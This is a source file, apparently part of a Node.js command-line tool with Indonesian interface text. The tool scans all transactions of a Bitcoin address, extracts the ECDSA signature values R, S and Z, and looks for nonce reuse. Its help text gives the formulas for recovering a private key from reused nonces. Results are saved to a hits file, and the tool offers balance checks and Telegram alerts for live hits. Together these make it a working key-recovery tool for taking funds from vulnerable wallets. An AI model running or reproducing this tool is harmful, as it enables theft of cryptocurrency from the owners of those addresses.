  for (let i = 0; i < tx.vin.length; i++) {
    if (tx.vin[i].prevout && tx.vin[i].prevout.scriptpubkey_address === address) ourInputs.push(i);
  }
  if (ourInputs.length === 0) return { sigs: [], err: null };
  let hex;
  try { hex = await fetchTxHexCached(base, tx.txid); }
  catch (e) { return { sigs: [], err: "ambil " + tx.txid + ": " + e.message }; }
  let parsed;
  try { parsed = parseTx(hexToBytes(hex.trim())); }
  catch (e) { return { sigs: [], err: "parse " + tx.txid + ": " + e.message }; }
  const out = [];
  for (const i of ourInputs) {
    const vi = parsed.vin[i];
    let pushes = parseScriptPushes(vi.scriptSig);
    let isWitness = false;
    if (pushes.length < 2 && vi.witness.length >= 2) { pushes = vi.witness; isWitness = true; }
    if (pushes.length < 2) continue;
    let der;
    try { der = parseDER(pushes[0]); } catch { continue; }
    const pubBytes = pushes[1];
    const pubHash = hash160(pubBytes);
    const sht = der.sighashType == null ? 1 : der.sighashType;
    let z = null;
    try {
      const scriptCode = concat(new Uint8Array([0x76, 0xa9, 0x14]), pubHash, new Uint8Array([0x88, 0xac]));
      if (isWitness) {
        const amt = tx.vin[i].prevout && tx.vin[i].prevout.value;
        if (amt === undefined) continue;
        z = BigInt("0x" + bytesToHex(bip143Sighash(parsed, i, scriptCode, amt, sht)));
      } else {
        z = BigInt("0x" + bytesToHex(legacySighash(parsed, i, scriptCode, sht)));
      }
    } catch { continue; }
    out.push({
      txid: tx.txid, inputIndex: i,
      r: der.r, s: der.s, z,
      pubkey: bytesToHex(pubBytes),
      pubkeyHash: bytesToHex(pubHash),
      address,
    });
  }
  return { sigs: out, err: null };
}

async function runWithConcurrency(items, limit, worker, onProgress) {
  const results = new Array(items.length);
  let next = 0;
  let done = 0;
  async function spawn() {
    while (true) {
      const i = next++;
      if (i >= items.length) return;
      results[i] = await worker(items[i], i);
      done++;
      if (onProgress) onProgress(done, items[i]);
    }
  }
  const workers = Array.from({ length: Math.min(limit, items.length) }, spawn);
  await Promise.all(workers);
  return results;
}

async function analyzeAddress(address, opts) {
  if (!opts) opts = {};
  const base = opts.api || DEFAULT_API;
  const concurrency = opts.concurrency || 8;
  console.log(c(C.bold, "\n=== Scan Address: " + address + " ==="));
  console.log("Sumber API :", base);
  console.log("Paralel    :", concurrency, "request");
  console.log("Cache      :", CACHE_ENABLED ? c(C.green, "AKTIF (.btc-cache/)") : c(C.yellow, "NONAKTIF"));
  CACHE_STATS = { hexHits: 0, hexMisses: 0, listHits: 0, listMisses: 0 };

  let txs;
  const cached = loadAddressListCache(address);
  const useCachedList = cached && (Date.now() - cached.ts) < (opts.listMaxAgeMs || CONFIG.cache.listMaxAgeHours * 3600 * 1000);
  if (useCachedList) {
    CACHE_STATS.listHits++;
    const ageMin = ((Date.now() - cached.ts) / 60000).toFixed(1);
    console.log("Daftar tx  :", c(C.cyan, "DARI CACHE (umur " + ageMin + " menit, " + cached.txs.length + " tx)"));
    txs = cached.txs;
  } else {
    CACHE_STATS.listMisses++;
    process.stdout.write("Mengambil daftar transaksi\u2026 ");
    txs = await fetchAllTxsForAddress(base, address);
    console.log(c(C.green, txs.length + " tx"));
    saveAddressListCache(address, txs);
  }

  if (txs.length === 0) {
    console.log(c(C.yellow, "Tidak ada transaksi untuk address ini."));
    return [];
  }

  const startTs = Date.now();
  const errors = [];
  const allSigs = [];
  drawProgress(0, txs.length, startTs);
  const results = await runWithConcurrency(
    txs,
    concurrency,
    (tx) => processTxForAddress(tx, address, base),
    (done, tx) => drawProgress(done, txs.length, startTs, tx.txid.slice(0, 16) + "\u2026")
  );
  process.stdout.write("\r\x1b[K");
  for (const r of results) {
    if (r.err) errors.push(r.err);
    for (const s of r.sigs) {
      s.index = allSigs.length;
      allSigs.push(s);
    }
  }
  const elapsed = ((Date.now() - startTs) / 1000).toFixed(1);
  console.log(
    c(C.green, "Selesai dalam " + elapsed + " dtk \u2014 ") +
    c(C.bold, allSigs.length + " signature") +
    " dari " + txs.length + " tx"
  );
  if (CACHE_ENABLED) {
    const total = CACHE_STATS.hexHits + CACHE_STATS.hexMisses;
    const pct = total ? ((CACHE_STATS.hexHits / total) * 100).toFixed(1) : "0";
    console.log(c(C.dim,
      "Cache tx hex: " + CACHE_STATS.hexHits + " hit, " + CACHE_STATS.hexMisses +
      " miss (" + pct + "% hit-rate)"));
  }
  if (errors.length) {
    console.log(c(C.yellow, errors.length + " error saat ambil/parse:"));
    for (const e of errors.slice(0, 5)) console.log(c(C.dim, "  - " + e));
    if (errors.length > 5) console.log(c(C.dim, "  \u2026 dan " + (errors.length - 5) + " lagi"));
  }

  if (opts.verbose) {
    for (const s of allSigs) {
      sep("tx " + s.txid.slice(0, 12) + "… vin#" + s.inputIndex);
      console.log("R :", c(C.yellow, padHex(s.r)));
      console.log("S :", c(C.yellow, padHex(s.s)));
      console.log("Z :", c(C.yellow, padHex(s.z)));
      console.log("Pubkey:", c(C.magenta, s.pubkey));
    }
  } else {
    console.log(c(C.dim, "(gunakan --verbose untuk melihat tiap R/S/Z)"));
  }
  if (opts.out) {
    const out = allSigs.map((s) => ({
      txid: s.txid, inputIndex: s.inputIndex,
      r: padHex(s.r), s: padHex(s.s), z: padHex(s.z), pubkey: s.pubkey,
    }));
    writeFileSync(opts.out, JSON.stringify(out, null, 2));
    console.log(c(C.green, "Disimpan ke: " + opts.out));
  }
  await detectReuse(allSigs, {
    scannedAddress: address,
    hitsFile: opts.hitsFile || "hits.txt",
    saveHits: opts.saveHits !== false,
    checkBalance: opts.checkBalance !== false,
    api: base,
  });
  return allSigs;
}

async function analyzeByTxid(txid, opts = {}) {
  const base = opts.api || DEFAULT_API;
  const meta = await esploraFetch(base, "/tx/" + txid);
  const hex = await fetchTxHexCached(base, txid);
  const amounts = {};
  for (let i = 0; i < meta.vin.length; i++) {
    if (meta.vin[i].prevout && meta.vin[i].prevout.value !== undefined) {
      amounts[i] = meta.vin[i].prevout.value;
    }
  }
  await analyzeTx(hex.trim(), { amounts });
}


// ============================================================
// CLI
// ============================================================
function help() {
  console.log(`
${c(C.bold, "btc-sig-analyzer")} — Penganalisis tanda tangan Bitcoin (CLI)

Penggunaan:
  node index.js                         Mode interaktif (menu pilihan)
  node index.js tx <hex>                Analisis raw transaksi (hex)
  node index.js tx-file <path>          Analisis raw transaksi dari file (hex)
  node index.js txid <txid>             Ambil & analisis tx via TXID (online)
  node index.js address <addr>          Scan SEMUA tx dari address (online)
                                         ekstrak R/S/Z, cari R-reuse otomatis
  node index.js sig --r <hex> --s <hex> --z <hex> [--pub <hex>]
                                         Analisis satu signature manual
  node index.js reuse <file.json>       Cari R-reuse dari daftar signature JSON
                                         Format: [{r,s,z,pubkey?}, ...]
  node index.js help                    Tampilkan bantuan

Opsi:
  --amount <i>=<satoshi>                 Nilai input ke-i (untuk 'tx' SegWit)
  --api <url>                            Endpoint Esplora kustom
                                         (default https://mempool.space/api)
                                         testnet: https://mempool.space/testnet/api
  --verbose                              Tampilkan tiap R/S/Z saat scan address
  --out <file.json>                      Simpan hasil scan ke file JSON
  --concurrency <n>                      Request paralel saat scan address (default 8)
  --hits <file.txt>                      File untuk simpan hit R-reuse (default hits.txt)
  --no-cache                             Nonaktifkan cache lokal
  clear-cache                            Hapus seluruh isi folder .btc-cache/

Konfigurasi (config.json di root, opsional):
  {
    "api": "https://mempool.space/api",
    "concurrency": 8,
    "hitsFile": "hits.txt",
    "cache": { "enabled": true, "listMaxAgeHours": 6 },
    "telegram": {
      "enabled": true,
      "botToken": "123456:ABC...",
      "chatId": "123456789",
      "notifyOnLiveOnly": true
    }
  }
  Bot Telegram dibuat lewat @BotFather; chatId via @userinfobot.

Yang dianalisis dari setiap input:
  • R, S          (komponen ECDSA dari DER signature)
  • Z             (message hash / sighash)
  • Public Key    (dari scriptSig atau witness)
  • PubKey Hash   (HASH160 dari pubkey)
  • Address       (P2PKH base58)

Pemulihan Private Key:
  Jika dua signature berbeda menggunakan nilai R yang sama (nonce reuse),
  private key dapat dipulihkan secara matematis:
    k = (z1 − z2) / (s1 − s2)  mod n
    d = (s1·k − z1) / r        mod n
`);
}

const rawArgv = process.argv.slice(2);
const FLAG_KEYS_WITH_VALUE = new Set(["api", "out", "hits", "concurrency", "amount"]);
const posArgs = [];
for (let i = 0; i < rawArgv.length; i++) {
  const a = rawArgv[i];
  if (a.startsWith("--")) {
    if (FLAG_KEYS_WITH_VALUE.has(a.slice(2))) i++;
  } else {
    posArgs.push(a);
  }
}
const cmd = posArgs[0];
const getOpt = (k) => {
  const i = rawArgv.indexOf("--" + k);
  return i >= 0 ? rawArgv[i + 1] : null;
};
const hasFlag = (k) => rawArgv.includes("--" + k);

async function interactiveMenu() {
  const rl = createInterface({ input, output });
  const ask = (q) => rl.question(q);
  try {
    console.log(c(C.bold, "\n╔══════════════════════════════════════════════════════╗"));
    console.log(c(C.bold, "║      btc-sig-analyzer  —  Mode Interaktif            ║"));
    console.log(c(C.bold, "╚══════════════════════════════════════════════════════╝"));
    console.log("Pilih jenis analisis:\n");
    console.log("  " + c(C.cyan, "1") + ") Scan Address  " + c(C.dim, "(semua tx dari 1 wallet, cari R-reuse)"));
    console.log("  " + c(C.cyan, "2") + ") Analisis TXID " + c(C.dim, "(1 transaksi via TXID)"));
    console.log("  " + c(C.cyan, "3") + ") Raw TX hex    " + c(C.dim, "(tempel hex transaksi)"));
    console.log("  " + c(C.cyan, "4") + ") Signature manual " + c(C.dim, "(masukkan R, S, Z)"));
    console.log("  " + c(C.cyan, "5") + ") Cek R-reuse dari file JSON");
    console.log("  " + c(C.cyan, "6") + ") Bantuan lengkap");
    console.log("  " + c(C.cyan, "7") + ") Hapus cache (.btc-cache/)");
    console.log("  " + c(C.cyan, "0") + ") Keluar\n");

    const choice = (await ask(c(C.bold, "Pilihan [0-7]: "))).trim();

    if (choice === "0" || choice === "") { rl.close(); return; }

    if (choice === "1") {
      const addr = (await ask("Address Bitcoin     : ")).trim();
      if (!addr) throw new Error("Address kosong");
      const apiIn = (await ask("API endpoint        [" + DEFAULT_API + "]: ")).trim();
      const conIn = (await ask("Paralel request     [8]: ")).trim();
      const verIn = (await ask("Verbose tampilkan tiap signature? (y/N): ")).trim().toLowerCase();
      const outIn = (await ask("Simpan semua signature ke file JSON [kosong = tidak]: ")).trim();
      const hitsIn = (await ask("File untuk simpan hit R-reuse [hits.txt]: ")).trim();
      rl.close();
      await analyzeAddress(addr, {
        api: apiIn || DEFAULT_API,
        concurrency: conIn ? Math.max(1, parseInt(conIn, 10)) : CONFIG.concurrency,
        verbose: verIn === "y" || verIn === "ya",
        out: outIn || null,
        hitsFile: hitsIn || CONFIG.hitsFile,
      });
    } else if (choice === "2") {
      const txid = (await ask("TXID                : ")).trim();
      if (!txid) throw new Error("TXID kosong");
      const apiIn = (await ask("API endpoint        [" + DEFAULT_API + "]: ")).trim();
      rl.close();
      await analyzeByTxid(txid, { api: apiIn || DEFAULT_API });
    } else if (choice === "3") {
      const hex = (await ask("Raw TX hex          : ")).trim();
      if (!hex) throw new Error("Hex kosong");
      rl.close();
      await analyzeTx(hex, { amounts: {} });
    } else if (choice === "4") {
      const r = (await ask("R (hex)             : ")).trim();
      const s = (await ask("S (hex)             : ")).trim();
      const z = (await ask("Z / sighash (hex)   : ")).trim();
      const pub = (await ask("Public key (hex, opsional): ")).trim();
      rl.close();
      if (!r || !s || !z) throw new Error("R, S, dan Z wajib diisi");
      await analyzeManual([{ r, s, z, pubkey: pub || undefined }]);
    } else if (choice === "5") {
      const path = (await ask("Path file JSON      : ")).trim();
      rl.close();
      const data = JSON.parse(readFileSync(path, "utf8"));
      if (!Array.isArray(data)) throw new Error("File harus berupa array JSON");
      await analyzeManual(data);
    } else if (choice === "6") {
      rl.close();
      help();
    } else if (choice === "7") {
      rl.close();
      if (existsSync(CACHE_DIR)) {
        rmSync(CACHE_DIR, { recursive: true, force: true });
        console.log(c(C.green, "Cache .btc-cache/ dihapus."));
      } else {
        console.log("Tidak ada cache untuk dihapus.");
      }
    } else {
      rl.close();
      console.log(c(C.red, "Pilihan tidak valid."));
    }
  } finally {
    try { rl.close(); } catch {}
  }
}

async function main() {
  if (hasFlag("no-cache")) CACHE_ENABLED = false;
  if (cmd === "clear-cache") {
    if (existsSync(CACHE_DIR)) {
      rmSync(CACHE_DIR, { recursive: true, force: true });
      console.log(c(C.green, "Cache .btc-cache/ dihapus."));
    } else {
      console.log("Tidak ada cache untuk dihapus.");
    }
    return;
  }
  if (!cmd) {
    await interactiveMenu();
    return;
  }
  if (cmd === "help" || cmd === "-h" || cmd === "--help") {
    help();
  } else if (cmd === "menu" || cmd === "i" || cmd === "interactive") {
    await interactiveMenu();
  } else if (cmd === "txid") {
    if (!posArgs[1]) throw new Error("TXID wajib diisi");
    await analyzeByTxid(posArgs[1], { api: getOpt("api") });
  } else if (cmd === "address") {
    if (!posArgs[1]) throw new Error("Address wajib diisi");
    await analyzeAddress(posArgs[1], {
      api: getOpt("api"),
      verbose: hasFlag("verbose"),
      out: getOpt("out"),
      hitsFile: getOpt("hits") || CONFIG.hitsFile,
      concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : CONFIG.concurrency,
    });
  } else if (cmd === "tx" || cmd === "tx-file") {
    const hex =
      cmd === "tx" ? posArgs[1] : readFileSync(posArgs[1], "utf8").trim();
    if (!hex) throw new Error("Hex transaksi kosong");
    const amounts = {};
    for (let i = 0; i < rawArgv.length - 1; i++) {
      if (rawArgv[i] !== "--amount") continue;
      const m = rawArgv[i + 1].match(/^(\d+)=(\d+)$/);
      if (m) amounts[Number(m[1])] = Number(m[2]);
    }
    await analyzeTx(hex, { amounts });
  } else if (cmd === "sig") {
    const r = getOpt("r"), s = getOpt("s"), z = getOpt("z"), pub = getOpt("pub");
    if (!r || !s || !z) throw new Error("Wajib --r, --s, --z");
    await analyzeManual([{ r, s, z, pubkey: pub }]);
  } else if (cmd === "reuse") {
    if (!posArgs[1]) throw new Error("Path file JSON wajib diisi");
    const data = JSON.parse(readFileSync(posArgs[1], "utf8"));
    if (!Array.isArray(data)) throw new Error("File harus berupa array JSON");
    await analyzeManual(data);
  } else {
    console.error(c(C.red, "Perintah tidak dikenal: " + cmd));
    help();
    process.exit(1);
  }
}

main().catch((e) => {
  console.error(c(C.red, "Error: " + e.message));
  process.exit(1);
});
